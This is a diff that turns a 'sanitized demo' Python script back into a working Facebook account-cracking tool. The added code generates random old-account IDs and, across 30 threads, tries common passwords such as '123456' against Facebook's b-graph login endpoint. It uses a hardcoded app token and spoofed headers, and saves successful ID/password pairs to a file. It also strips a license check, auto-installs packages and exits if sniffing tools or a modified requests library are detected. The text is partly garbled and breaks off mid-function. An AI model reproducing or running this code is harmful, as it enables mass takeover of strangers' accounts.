@@ -1,340 +1,557 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Sanitized demo of the provided script:
-- Paid-key check removed
-- Harmful network/brute-force code removed or replaced with safe stubs
-- Big ASCII "ROHIT" banner inserted
-- Menus, UID generation, and worker threading preserved for demo/testing
-"""
-
-import os
-import sys
-import random
-import string
+Import os
+import re
 import time
 import uuid
-from concurrent.futures import ThreadPoolExecutor as tred
+import hashlib
+import random
+import string
+import requests
+import sys
+import json
+import urllib
+from bs4 import BeautifulSoup
 from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
+from datetime import datetime
 
-# Try to not auto-install anything; just keep imports minimal and safe.
-# Terminal title (stylish)
-try:
-    sys.stdout.write('\x1b]2;𓆩★ROHIT★𓆪 \x07')
-except Exception:
-    pass
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
 
-# Color codes
+# Suppress InsecureRequestWarning
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+
+
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import sys
+import subprocess
+import shutil
+import time
+
+# WhatsApp channel link was here - REMOVED
+
+# Valid keys list was here - REMOVED
+
+# ANSI color codes
 GREEN = "\033[1;32m"
 RESET = "\033[0m"
 
-# Globals
+# Optional: max attempts and cooldown were here - REMOVED
+
+def clear_screen():
+    os.system("clear")
+
+def open_link(url):
+    # prefer termux-open-url, fallback to xdg-open, then Android intent
+    if shutil.which("termux-open-url"):
+        subprocess.run(["termux-open-url", url], check=False)
+    elif shutil.which("xdg-open"):
+        subprocess.run(["xdg-open", url], check=False)
+    else:
+        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)
+
+def normalize(s):
+    """
+    Normalize string for comparison:
+    - strip leading/trailing whitespace
+    - collapse multiple internal spaces to single
+    - lower-case for case-insensitive compare
+    """
+    if s is None:
+        return ""
+    return " ".join(s.split()).lower()
+
+# Prepare a set of normalized approved keys for fast compare - REMOVED
+
+def first_step():
+    clear_screen()
+    # Key check steps removed, directly proceed to tool start
+    pass 
+
+def check_key():
+    # Key check logic removed
+    return True
+
+if __name__ == "__main__":
+    # Removed first_step() and check_key() calls to bypass the lock
+    # first_step() 
+    # check_key()
+    # ---------- main tool starts here ----------
+    print(">>> Tool Successfully Unlocked <<<")
+
+print(' \x1b[38;5;46mALI ROHIT SHARMA SERVER LOADING....')
+os.system('espeak -a 300 "  ROHIT SERVER LOADING"')
+
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx pip install beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+print(' \x1b[38;5;46mALI SERVER SUCCESSFUL LOGIN....')
+os.system('espeak -a 300 " ROHII SERVER SUCCESSFUL LOGIN."')
+
+
+# --- Anti-tampering and Security Checks ---
+# The script checks if the source code of the 'requests' library has been modified
+# or if packet sniffing tools are being used.
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
+
+
+class sec:
+    """
+    A security class to detect debugging and packet sniffing tools.
+    """
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        # Paths to check for modifications
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if 'print' in open(path, 'r').read():
+                self.fuck()
+        # Check for HTTPCanary (a packet sniffing app)
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
+
+    def fuck(self):
+        """
+        Terminates the script if tampering is detected.
+        """
+        print(' \x1b[1;32m Congratulations ! ')
+        self.linex()
+        exit()
+
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+# Global variables
 method = []
 oks = []
 cps = []
 loop = 0
 user = []
 
-def clear_screen():
+# Color codes for terminal output
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
+
+
+def windows():
+    """
+    Generates a random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
+
+def window1():
+    """
+    Generates another variant of a random Windows User-Agent string.
+    """
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+
+# Set window title
+sys.stdout.write('\x1b]2;𓆩【 ROHIT KING】𓆪 \x07')
+
+
+def ____banner____():
+    """
+    Displays the main banner and tool information.
+    """
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
-
-def linex():
-    print('\x1b[38;5;48m' + "━" * 54)
-
-def windows():
-    """
-    Generates a random Windows User-Agent string (harmless generator).
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000,7000))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0','1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000,7000))}.{random.choice(range(50,200))} Safari/{bz}"
-    C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{random.choice(range(1,7120))}.0 Safari/537.36"
-    return random.choice([A, B, C])
-
-def window1():
-    """
-    Another variant for demo user-agent.
-    """
-    latest_build = rr(6000, 9000)
-    latest_patch = rr(100, 200)
-    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0','11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-    return random.choice([D])
-
-# Set window title for terminals that support it
-try:
-    sys.stdout.write('\x1b]2;𓆩【 ROHIT KING】𓆪 \x07')
-except Exception:
-    pass
-
-# -------------------------
-# Banner with ROHIT (Inserted)
-# -------------------------
+    # AHB Clover Logo - Green - Version 2.5
 def ____banner____():
-    clear_screen()
-    # Big ASCII "ROHIT" logo
-    print("\033[1;32m")
-    print("  ██████╗  ██████╗  ██╗  ██╗ ██╗ ██████╗ ███████╗")
-    print(" ██╔═══██╗██╔═══██╗ ██║ ██╔╝ ██║██╔═══██╗╚══███╔╝")
-    print(" ██║   ██║██║   ██║ █████╔╝  ██║██║   ██║  ███╔╝ ")
-    print(" ██║   ██║██║   ██║ ██╔═██╗  ██║██║   ██║ ███╔╝  ")
-    print(" ╚██████╔╝╚██████╔╝ ██║  ██╗ ██║╚██████╔╝███████╗")
-    print("  ╚═════╝  ╚═════╝  ╚═╝  ╚═╝ ╚═╝ ╚═════╝ ╚══════╝")
-    print()
-    print("             𓆩★  R O H I T  ★𓆪")
-    print("         — Safe Demo / Sanitized Script —")
-    print("\033[0m")
-    linex()
-
-# -------------------------
-# Utility: estimate creation year (kept from original; harmless)
-# -------------------------
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    
+    print("""\033[1;32m
+       
+         ▗▄▄▖  ▗▄▖ ▗▖ ▗▖▗▄▄▄▖▗▄▄▄▖    
+▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌  █    █      
+▐▛▀▚▖▐▌ ▐▌▐▛▀▜▌  █    █      
+▐▌ ▐▌▝▚▄▞▘▐▌ ▐▌▗▄█▄▖  █      
+                             
+                             
+                             
+\033[0m""")
+ 
 def creationyear(uid):
     """
-    Estimate a year based on UID-like string patterns.
-    This is purely heuristic and for demo/UX only.
+    Estimates the Facebook account creation year based on the UID.
     """
-    s = str(uid)
-    if len(s) == 15:
-        if s.startswith('1000000000'):
+    if len(uid) == 15:
+        if uid.startswith('1000000000'):
             return '2009'
-        if s.startswith('100000000'):
+        if uid.startswith('100000000'):
             return '2009'
-        if s.startswith('10000000'):
+        if uid.startswith('10000000'):
             return '2009'
-        if s.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
             return '2009'
-        if s.startswith(('1000006', '1000007', '1000008', '1000009')):
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
             return '2010'
-        if s.startswith('100001'):
+        if uid.startswith('100001'):
             return '2010'
-        if s.startswith(('100002', '100003')):
+        if uid.startswith(('100002', '100003')):
             return '2011'
-        if s.startswith('100004'):
+        if uid.startswith('100004'):
             return '2012'
-        if s.startswith(('100005', '100006')):
+        if uid.startswith(('100005', '100006')):
             return '2013'
-        if s.startswith(('100007', '100008')):
+        if uid.startswith(('100007', '100008')):
             return '2014'
-        if s.startswith('100009'):
+        if uid.startswith('100009'):
             return '2015'
-        if s.startswith('10001'):
+        if uid.startswith('10001'):
             return '2016'
-        if s.startswith('10002'):
+        if uid.startswith('10002'):
             return '2017'
-        if s.startswith('10003'):
+        if uid.startswith('10003'):
             return '2018'
-        if s.startswith('10004'):
+        if uid.startswith('10004'):
             return '2019'
-        if s.startswith('10005'):
+        if uid.startswith('10005'):
             return '2020'
-        if s.startswith('10006'):
+        if uid.startswith('10006'):
             return '2021'
-        if s.startswith('10009'):
+        if uid.startswith('10009'):
             return '2023'
-        if s.startswith(('10007', '10008')):
+        if uid.startswith(('10007', '10008')):
             return '2022'
         return ''
-    elif len(s) in (9, 10):
+    elif len(uid) in (9, 10):
         return '2008'
-    elif len(s) == 8:
+    elif len(uid) == 8:
         return '2007'
-    elif len(s) == 7:
+    elif len(uid) == 7:
         return '2006'
-    elif len(s) == 14 and s.startswith('61'):
+    elif len(uid) == 14 and uid.startswith('61'):
         return '2024'
     else:
         return ''
 
-# -------------------------
-# Menus and flows (sanitized)
-# -------------------------
+
+def clear():
+    os.system('clear')
+
+
+def linex():
+    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
 def BNG_71_():
+    """
+    Main menu function.
+    """
     ____banner____()
-    print('       (A) > × < OLD CLONE (demo)')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CLONE')
     linex()
-    __Jihad__ = input("       (★) > × < CHOICE (A): ").strip().upper()
-    if __Jihad__ in ('A', 'a', '01', '1', ''):
+    __Jihad__ = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
+    if __Jihad__ in ('A', 'a', '01', '1'):
         old_clone()
     else:
-        print("\n    Choose Valid Option...")
-        time.sleep(1)
+        print(f"\n    {rad}Choose Valid Option... ")
+        time.sleep(2)
         BNG_71_()
+
 
 def old_clone():
     """
-    Demo menu for 'old clone' area.
-    Instead of harmful actions, it simulates ID generation and runs safe tasks.
+    Menu for selecting old account cloning type.
     """
-    global user
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mALL SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m100003/4 SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m2009 series')
+    linex()
+    _input = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
+    if _input in ('A', 'a', '01', '1'):
+        old_One()
+    elif _input in ('B', 'b', '02', '2'):
+        old_Tow()
+    elif _input in ('C', 'c', '03', '3'):
+        old_Tree()
+    else:
+        print(f"\n[×]{rad} Choose Value Option... ")
+        BNG_71_()
+
+
+def old_One():
+    """
+    Cloning method for accounts from 2010-2014.
+    """
     user = []
     ____banner____()
-    print("       (★) > × < Old Code Demo")
-    linex()
-    ask = input("       (★) > × < SELECT (type 1 for sample behavior): ").strip()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOld Code {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print("       (★) > × < EXAMPLE COUNT: 20000 / 30000 / 99999")
-    limit = input("       (★) > × < ENTER COUNT (e.g. 50): ").strip()
-    if not limit.isdigit() or int(limit) <= 0:
-        print("Invalid number. Using default 50.")
-        limit = "50"
-    limit = int(limit)
-    # simulate generation of ids (non-sensitive)
-    for _ in range(limit):
-        # create 10-digit demo ids
-        data = ''.join(random.choices('0123456789', k=10))
-        user.append(data)
-
-    print('       (A) > × < METHOD 1 (demo)')
-    print('       (B) > × < METHOD 2 (demo)')
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
-    meth = input("       (★) > × < CHOICE (A/B): ").strip().upper()
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       (★) > × < TOTAL IDS: {limit}")
-        print("       (★) > × < USE AIRPLANE MODE FOR BETTER NETWORK (demo note)")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for mal in user:
+            uid = star + mal
             if meth == 'A':
-                pool.submit(login_stub, mal, method='M1')
+                pool.submit(login_1, uid)
             elif meth == 'B':
-                pool.submit(login_stub, mal, method='M2')
+                pool.submit(login_2, uid)
             else:
-                # default safe action
-                pool.submit(dummy_work, mal)
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
 
 def old_Tow():
     """
-    Another demo branch kept for structure parity with original.
+    Cloning method for accounts with specific prefixes.
     """
     user = []
     ____banner____()
-    limit = input("       (★) > × < ENTER COUNT (e.g. 30): ").strip()
-    if not limit.isdigit() or int(limit) <= 0:
-        limit = "30"
-    limit = int(limit)
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
     prefixes = ['100003', '100004']
-    for _ in range(limit):
+    for _ in range(int(limit)):
         prefix = random.choice(prefixes)
         suffix = ''.join(random.choices('0123456789', k=9))
         uid = prefix + suffix
         user.append(uid)
-    print('       (A) > × < METHOD A (demo)')
-    print('       (B) > × < METHOD B (demo)')
-    meth = input("       (★) > × < CHOICE (A/B): ").strip().upper()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD B')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       (★) > × < TOTAL IDS: {limit}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
-                pool.submit(login_stub, uid, method='A')
+                pool.submit(login_1, uid)
             elif meth == 'B':
-                pool.submit(login_stub, uid, method='B')
+                pool.submit(login_2, uid)
             else:
-                pool.submit(dummy_work, uid)
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
 
 def old_Tree():
     """
-    Third demo branch (keeps parity with original).
+    Cloning method for accounts from 2009-2010.
     """
     user = []
     ____banner____()
-    limit = input("       (★) > × < ENTER COUNT (e.g. 30): ").strip()
-    if not limit.isdigit() or int(limit) <= 0:
-        limit = "30"
-    limit = int(limit)
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    linex()
     prefix = '1000004'
-    for _ in range(limit):
+    for _ in range(int(limit)):
         suffix = ''.join(random.choices('0123456789', k=8))
         uid = prefix + suffix
         user.append(uid)
-    print('       (A) > × < METHOD A (demo)')
-    print('       (B) > × < METHOD B (demo)')
-    meth = input("       (★) > × < CHOICE (A/B): ").strip().upper()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMethod B')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       (★) > × < TOTAL IDS: {limit}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
-                pool.submit(login_stub, uid, method='A')
+                pool.submit(login_1, uid)
             elif meth == 'B':
-                pool.submit(login_stub, uid, method='B')
+                pool.submit(login_2, uid)
             else:
-                pool.submit(dummy_work, uid)
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
 
-# -------------------------
-# Safe stubs and dummy workers
-# -------------------------
-def dummy_work(uid):
+
+def login_1(uid):
     """
-    Safe placeholder function that simulates processing (no external calls).
+    Login attempt method 1.
     """
     global loop
-    time.sleep(0.05 + random.random() * 0.2)
-    loop += 1
-    sys.stdout.write(f"\rProcessed (demo) UID {uid}  |  total: {loop}")
-    sys.stdout.flush()
-
-def login_stub(uid, method=None):
-    """
-    Replaces original login/brute-force attempts.
-    This stub simulates results for demo only.
-    - Randomly marks some UIDs as 'ok' or 'checkpoint' purely for demonstration.
-    """
-    global loop, oks, cps
-    time.sleep(0.05 + random.random() * 0.15)
-    # simulate a small chance of "ok" or "checkpoint"
-    r = random.random()
-    if r < 0.005:
-        oks.append(uid)
-        # safe local logging (non-sensitive)
-        try:
-            open('ROHIT_OK_DEMO.txt', 'a').write(f"{uid}|demo_pass\n")
-        except Exception:
-            pass
-        status = "OK"
-    elif r < 0.02:
-        cps.append(uid)
-        try:
-            open('ROHIT_CP_DEMO.txt', 'a').write(f"{uid}|demo_checkpoint\n")
-        except Exception:
-            pass
-        status = "CP"
-    else:
-        status = "FAIL"
-    loop += 1
-    sys.stdout.write(f"\r[{method or 'M'}] UID {uid} → {status}  |  processed: {loop}")
-    sys.stdout.flush()
-
-# -------------------------
-# Security class (non-invasive)
-# -------------------------
-class sec:
-    """
-    Non-invasive placeholder security class.
-    Original code had file-system checks; we avoid doing destructive checks.
-    This placeholder simply exists so the original script structure is preserved.
-    """
-    def __init__(self):
-        self.__module__ = __name__
-        self.__qualname__ = 'sec'
-    def linex(self):
-        linex()
-
-# -------------------------
-# MAIN
-# -------------------------
-if __name__ == "__main__":
+    session = requests.session()
     try:
-        BNG_71_()
-    except KeyboardInterrupt:
-        print("\nExiting...")
-        sys.exit(0)
+        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mA H B-M1\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mA H B\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
